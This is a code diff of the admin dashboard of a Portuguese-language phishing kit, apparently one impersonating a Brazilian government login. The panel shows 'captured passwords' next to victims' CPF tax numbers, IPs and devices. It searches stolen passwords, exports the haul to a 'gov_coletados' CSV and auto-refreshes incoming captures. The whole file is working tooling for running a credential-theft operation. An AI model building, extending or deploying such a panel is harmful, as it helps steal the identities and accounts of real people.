+    // ========== SIDEBAR ==========
+    function toggleSidebar() {
+        document.getElementById('sidebar').classList.toggle('open');
+    }
+
+    document.querySelectorAll('.nav-item').forEach(item => {
+        item.addEventListener('click', () => {
+            const tab = item.getAttribute('data-tab');
+            document.querySelectorAll('.nav-item').forEach(nav => nav.classList.remove('active'));
+            item.classList.add('active');
+            document.querySelectorAll('.tab-content').forEach(content => content.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+            
+            const titles = {
+                dashboard: 'Dashboard',
+                users: 'Usuários',
+                logs: 'Logs',
+                security: 'Segurança',
+                settings: 'Configurações'
+            };
+            document.getElementById('pageTitle').innerHTML = titles[tab] || 'Dashboard';
+            document.getElementById('pageSubtitle').innerHTML = tab === 'dashboard' ? 'Visão geral do sistema' : 'Gerenciamento';
+            
+            if (window.innerWidth <= 768) {
+                document.getElementById('sidebar').classList.remove('open');
+            }
+        });
+    });
+
+    // ========== FUNÇÕES PRINCIPAIS ==========
+    async function carregarTodosDados() {
+        if (!adminToken) return;
+        
+        document.getElementById('ultimaAtualizacao').innerHTML = new Date().toLocaleString();
+        
+        try {
+            // Estatísticas
+            const statsRes = await fetch('/api/admin/stats', {
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const statsData = await statsRes.json();
+            const stats = statsData.stats || {};
+            
+            document.getElementById('statsGrid').innerHTML = `
+                <div class="stat-card">
+                    <div class="stat-header"><div class="stat-icon"><i class="fas fa-users"></i></div></div>
+                    <div class="stat-value">${stats.total_users || 0}</div>
+                    <div class="stat-label">Total Usuários</div>
+                    <div class="stat-change"><i class="fas fa-check-circle"></i> +${stats.com_senha || 0} com senha</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header"><div class="stat-icon"><i class="fas fa-key"></i></div></div>
+                    <div class="stat-value">${stats.com_senha || 0}</div>
+                    <div class="stat-label">Senhas Capturadas</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header"><div class="stat-icon"><i class="fas fa-chart-line"></i></div></div>
+                    <div class="stat-value">${stats.total_logs || 0}</div>
+                    <div class="stat-label">Total de Logs</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-header"><div class="stat-icon"><i class="fas fa-shield-alt"></i></div></div>
+                    <div class="stat-value">${stats.tentativas_admin || 0}</div>
+                    <div class="stat-label">Tentativas de Acesso</div>
+                </div>
+            `;
+            
+            document.getElementById('usersBadge').innerHTML = stats.total_users || 0;
+            document.getElementById('totalUsersSpan').innerHTML = `(${stats.total_users || 0} registros)`;
+            
+            // Usuários
+            const usersRes = await fetch('/api/admin/users', {
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const usersData = await usersRes.json();
+            allUsers = usersData.users || [];
+            renderUsersTable(allUsers);
+            
+            // Logs
+            const logsRes = await fetch('/api/admin/logs', {
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const logsData = await logsRes.json();
+            allLogs = logsData.logs || [];
+            renderLogs(allLogs);
+            renderUltimasAtividades(allLogs.slice(0, 10));
+            
+            // Tentativas
+            const tentativasRes = await fetch('/api/admin/tentativas', {
+                headers: { 'Authorization': `Bearer ${adminToken}` }
+            });
+            const tentativasData = await tentativasRes.json();
+            const tentativas = tentativasData.tentativas || [];
+            renderTentativas(tentativas);
+            
+            // Estatísticas de segurança
+            const hoje = new Date().toDateString();
+            const tentativasHoje = tentativas.filter(t => new Date(t.data).toDateString() === hoje).length;
+            const ipsDiferentes = [...new Set(tentativas.map(t => t.ip))].length;
+            document.getElementById('tentativasHoje').innerHTML = tentativasHoje;
+            document.getElementById('ipsDiferentes').innerHTML = ipsDiferentes;
+            
+            // Gráficos
+            atualizarGraficos(allLogs, allUsers);
+            
+        } catch (error) {
+            console.error('Erro:', error);
+        }
     }
     
     function formatarCPF(cpf) {
@@ -623,152 +1160,232 @@
         return cpf;
     }
     
-    async function carregarDados() {
-        if (!adminToken) return;
-        
-        try {
-            // Estatísticas
-            const statsRes = await fetch('/api/admin/stats', {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const statsData = await statsRes.json();
-            const stats = statsData.stats || {};
-            
-            const statsGrid = document.getElementById('statsGrid');
-            statsGrid.innerHTML = `
-                <div class="stat-card"><div class="stat-value">${stats.total_users || 0}</div><div class="stat-label">Total Usuários</div></div>
-                <div class="stat-card"><div class="stat-value">${stats.com_senha || 0}</div><div class="stat-label">Com Senha</div></div>
-                <div class="stat-card"><div class="stat-value">${stats.total_logs || 0}</div><div class="stat-label">Total Logs</div></div>
-                <div class="stat-card"><div class="stat-value">${stats.tentativas_admin || 0}</div><div class="stat-label">Tentativas Admin</div></div>
-            `;
-            
-            // Usuários
-            const usersRes = await fetch('/api/admin/users', {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const usersData = await usersRes.json();
-            const users = usersData.users || [];
-            
-            const usersTable = document.getElementById('usersTable');
-            if (users.length === 0) {
-                usersTable.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado</td></tr>';
-            } else {
-                usersTable.innerHTML = users.map(u => `
-                    <tr>
-                        <td>${formatarCPF(u.cpf)}</td>
-                        <td class="senha">${u.senha || '--------'}</td>
-                        <td>${u.ip || u.ip_senha || '-'}</td>
-                        <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
-                        <td>${u.navegador || u.navegador_senha || '-'}</td>
-                        <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
-                        <td><button class="btn-delete" onclick="deletarUsuario('${u.cpf}')">Excluir</button></td>
-                    </tr>
-                `).join('');
-            }
-            
-            // Logs
-            const logsRes = await fetch('/api/admin/logs', {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const logsData = await logsRes.json();
-            const logs = logsData.logs || [];
-            
-            const logsDiv = document.getElementById('logsList');
-            if (logs.length === 0) {
-                logsDiv.innerHTML = '<div class="log-entry">Nenhum log registrado</div>';
-            } else {
-                logsDiv.innerHTML = logs.map(log => `
-                    <div class="log-entry">
-                        [${new Date(log.data).toLocaleString()}] 
-                        <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo}</span>
-                        CPF: ${log.cpf} | IP: ${log.ip || '-'} | ${log.dispositivo || '-'}
-                        ${log.senha ? '<span style="color:#ffaa00"> | SENHA: ' + log.senha + '</span>' : ''}
-                    </div>
-                `).join('');
-            }
-            
-            // Últimos logs para dashboard
-            const ultimosLogs = document.getElementById('ultimosLogs');
-            if (ultimosLogs) {
-                ultimosLogs.innerHTML = logs.slice(0, 10).map(log => `
-                    <div class="log-entry">
-                        [${new Date(log.data).toLocaleString()}] 
-                        <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo}</span>
-                        CPF: ${log.cpf} | ${log.dispositivo || '-'}
-                    </div>
-                `).join('');
-            }
-            
-            // Tentativas de admin
-            const tentativasRes = await fetch('/api/admin/tentativas', {
-                headers: { 'Authorization': `Bearer ${adminToken}` }
-            });
-            const tentativasData = await tentativasRes.json();
-            const tentativas = tentativasData.tentativas || [];
-            
-            const tentativasTable = document.getElementById('tentativasTable');
-            if (tentativas.length === 0) {
-                tentativasTable.innerHTML = '<tr><td colspan="3" style="text-align:center">Nenhuma tentativa registrada</td></tr>';
-            } else {
-                tentativasTable.innerHTML = tentativas.map(t => `
-                    <tr>
-                        <td>${t.ip || '-'}</td>
-                        <td>${t.tentativa || '-'}</td>
-                        <td>${new Date(t.data).toLocaleString()}</td>
-                    </tr>
-                `).join('');
-            }
-            
-        } catch (error) {
-            console.error('Erro ao carregar dados:', error);
+    function renderUsersTable(users) {
+        const tbody = document.getElementById('usersTable');
+        if (users.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="7" style="text-align:center">Nenhum dado coletado</td</tr>';
+        } else {
+            tbody.innerHTML = users.map(u => `
+                <tr>
+                    <td><strong>${formatarCPF(u.cpf)}</strong></td>
+                    <td class="senha-cell">${u.senha || '--------'}</td>
+                    <td>${u.ip || u.ip_senha || '-'}</td>
+                    <td>${u.dispositivo || u.dispositivo_senha || '-'}</td>
+                    <td>${u.navegador || u.navegador_senha || '-'}</td>
+                    <td>${u.data_senha ? new Date(u.data_senha).toLocaleString() : (u.data_cpf ? new Date(u.data_cpf).toLocaleString() : '-')}</td>
+                    <td><button onclick="deletarUsuario('${u.cpf}')" style="background: var(--danger); border: none; padding: 6px 12px; border-radius: 8px; color: white; cursor: pointer;"><i class="fas fa-trash"></i></button></td>
+                </tr>
+            `).join('');
         }
     }
     
+    function renderLogs(logs) {
+        const logsDiv = document.getElementById('logsList');
+        if (logs.length === 0) {
+            logsDiv.innerHTML = '<div class="log-item">Nenhum log registrado</div>';
+        } else {
+            logsDiv.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div class="log-time">${new Date(log.data).toLocaleString()}</div>
+                    <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo === 'senha_inserida' ? 'SENHA' : 'CPF'}</span>
+                    <div><strong>${formatarCPF(log.cpf)}</strong></div>
+                    <div style="flex:1">${log.dispositivo || '-'}</div>
+                    ${log.senha ? `<span class="senha-cell">Senha: ${log.senha}</span>` : ''}
+                </div>
+            `).join('');
+        }
+    }
+    
+    function renderUltimasAtividades(logs) {
+        const container = document.getElementById('ultimasAtividades');
+        if (logs.length === 0) {
+            container.innerHTML = '<div class="log-item">Nenhuma atividade recente</div>';
+        } else {
+            container.innerHTML = logs.map(log => `
+                <div class="log-item">
+                    <div class="log-time">${new Date(log.data).toLocaleString()}</div>
+                    <span class="badge ${log.tipo === 'senha_inserida' ? 'badge-success' : 'badge-danger'}">${log.tipo === 'senha_inserida' ? '🔐 SENHA' : '📝 CPF'}</span>
+                    <div><strong>${formatarCPF(log.cpf)}</strong></div>
+                    <div style="flex:1">${log.dispositivo || '-'}</div>
+                </div>
+            `).join('');
+        }
+    }
+    
+    function renderTentativas(tentativas) {
+        const tbody = document.getElementById('tentativasTable');
+        if (tentativas.length === 0) {
+            tbody.innerHTML = '<tr><td colspan="3" style="text-align:center">Nenhuma tentativa registrada</td</tr>';
+        } else {
+            tbody.innerHTML = tentativas.map(t => `
+                <tr>
+                    <td><code>${t.ip || '-'}</code></td>
+                    <td>${t.tentativa || '-'}</td>
+                    <td>${new Date(t.data).toLocaleString()}</td>
+                </tr>
+            `).join('');
+        }
+    }
+    
+    function atualizarGraficos(logs, users) {
+        // Gráfico de coletas por dia
+        const dias = {};
+        logs.forEach(log => {
+            const dia = new Date(log.data).toLocaleDateString();
+            dias[dia] = (dias[dia] || 0) + 1;
+        });
+        
+        const labels = Object.keys(dias).slice(-7);
+        const data = labels.map(l => dias[l]);
+        
+        if (dailyChart) dailyChart.destroy();
+        const ctx = document.getElementById('dailyChart').getContext('2d');
+        dailyChart = new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: labels,
+                datasets: [{
+                    label: 'Coletas',
+                    data: data,
+                    borderColor: '#6366f1',
+                    backgroundColor: 'rgba(99, 102, 241, 0.1)',
+                    tension: 0.3,
+                    fill: true
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: { legend: { position: 'bottom' } }
+            }
+        });
+        
+        // Gráfico de dispositivos
+        const dispositivos = { Desktop: 0, Mobile: 0, Tablet: 0 };
+        users.forEach(u => {
+            const disp = u.dispositivo || u.dispositivo_senha || 'Desktop';
+            if (dispositivos[disp] !== undefined) dispositivos[disp]++;
+            else dispositivos.Desktop++;
+        });
+        
+        if (deviceChart) deviceChart.destroy();
+        const ctx2 = document.getElementById('deviceChart').getContext('2d');
+        deviceChart = new Chart(ctx2, {
+            type: 'doughnut',
+            data: {
+                labels: ['Desktop', 'Mobile', 'Tablet'],
+                datasets: [{
+                    data: [dispositivos.Desktop, dispositivos.Mobile, dispositivos.Tablet],
+                    backgroundColor: ['#6366f1', '#10b981', '#f59e0b']
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: true,
+                plugins: { legend: { position: 'bottom' } }
+            }
+        });
+    }
+    
+    function filtrarUsuarios() {
+        const termo = document.getElementById('searchUsers').value.toLowerCase();
+        const filtrados = allUsers.filter(u => 
+            (u.cpf || '').toLowerCase().includes(termo) ||
+            (u.senha || '').toLowerCase().includes(termo) ||
+            (u.ip || '').toLowerCase().includes(termo)
+        );
+        renderUsersTable(filtrados);
+    }
+    
+    function filtrarLogs() {
+        const termo = document.getElementById('searchLogs').value.toLowerCase();
+        const filtrados = allLogs.filter(l => 
+            (l.cpf || '').toLowerCase().includes(termo) ||
+            (l.tipo || '').toLowerCase().includes(termo)
+        );
+        renderLogs(filtrados);
+    }
+    
     async function deletarUsuario(cpf) {
-        if (!confirm(`Tem certeza que deseja excluir o usuário ${cpf}?`)) return;
+        if (!confirm(`⚠️ Tem certeza que deseja excluir o usuário ${formatarCPF(cpf)}?`)) return;
         try {
             await fetch(`/api/admin/delete/${encodeURIComponent(cpf)}`, {
                 method: 'DELETE',
                 headers: { 'Authorization': `Bearer ${adminToken}` }
             });
-            carregarDados();
+            carregarTodosDados();
         } catch (error) {
             alert('Erro ao deletar usuário');
         }
     }
     
-    async function limparDados() {
-        if (!confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados coletados. Continuar?')) return;
+    async function limparTodosDados() {
+        if (!confirm('⚠️ ATENÇÃO! Isso vai apagar TODOS os dados coletados. Esta ação é irreversível!\n\nDeseja continuar?')) return;
         try {
             await fetch('/api/admin/clear', {
                 method: 'POST',
                 headers: { 'Authorization': `Bearer ${adminToken}` }
             });
-            carregarDados();
-            alert('Todos os dados foram removidos');
+            carregarTodosDados();
+            alert('✅ Todos os dados foram removidos');
         } catch (error) {
             alert('Erro ao limpar dados');
         }
     }
     
-    // Navegação
-    document.querySelectorAll('.menu-item').forEach(item => {
-        item.addEventListener('click', () => {
-            const tab = item.getAttribute('data-tab');
-            document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
-            item.classList.add('active');
-            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
-            document.getElementById(`tab-${tab}`).classList.add('active');
-            if (window.innerWidth <= 768) {
-                document.getElementById('sidebar').classList.remove('open');
-            }
+    function exportarCSV() {
+        if (allUsers.length === 0) {
+            alert('Nenhum dado para exportar');
+            return;
+        }
+        
+        let csv = "CPF,SENHA,IP,Dispositivo,Navegador,Data\n";
+        allUsers.forEach(u => {
+            csv += `"${u.cpf}","${u.senha || ''}","${u.ip || u.ip_senha || ''}","${u.dispositivo || u.dispositivo_senha || ''}","${u.navegador || u.navegador_senha || ''}","${u.data_senha || u.data_cpf || ''}"\n`;
         });
-    });
+        
+        const blob = new Blob([csv], { type: 'text/csv' });
+        const link = document.createElement('a');
+        link.href = URL.createObjectURL(blob);
+        link.download = `gov_coletados_${new Date().toISOString().slice(0,19)}.csv`;
+        link.click();
+    }
     
-    let refreshInterval = null;
+    async function alterarSenha() {
+        const novaSenha = document.getElementById('novaSenha').value;
+        const msgDiv = document.getElementById('senhaMsg');
+        
+        if (!novaSenha || novaSenha.length < 6) {
+            msgDiv.innerHTML = '<span style="color: var(--danger);">❌ Senha deve ter pelo menos 6 caracteres</span>';
+            return;
+        }
+        
+        try {
+            const res = await fetch('/api/admin/change-password', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${adminToken}`
+                },
+                body: JSON.stringify({ nova_senha: novaSenha })
+            });
+            
+            const data = await res.json();
+            if (data.success) {
+                msgDiv.innerHTML = '<span style="color: var(--success);">✅ Senha alterada com sucesso!</span>';
+                document.getElementById('novaSenha').value = '';
+                setTimeout(() => msgDiv.innerHTML = '', 3000);
+            } else {
+                msgDiv.innerHTML = `<span style="color: var(--danger);">❌ ${data.error}</span>`;
+            }
+        } catch (error) {
+            msgDiv.innerHTML = '<span style="color: var(--danger);">❌ Erro ao alterar senha</span>';
+        }
+    }
+    
     function iniciarRefresh() {
         if (refreshInterval) clearInterval(refreshInterval);
-        refreshInterval = setInterval(carregarDados, 10000);
+        refreshInterval = setInterval(carregarTodosDados, 15000);
     }
     
     // Verificar token salvo
@@ -777,7 +1394,7 @@
         adminToken = savedToken;
         document.getElementById('loginScreen').style.display = 'none';
         document.getElementById('adminPanel').classList.add('visible');
-        carregarDados();
+        carregarTodosDados();
         iniciarRefresh();
     }
 </script>
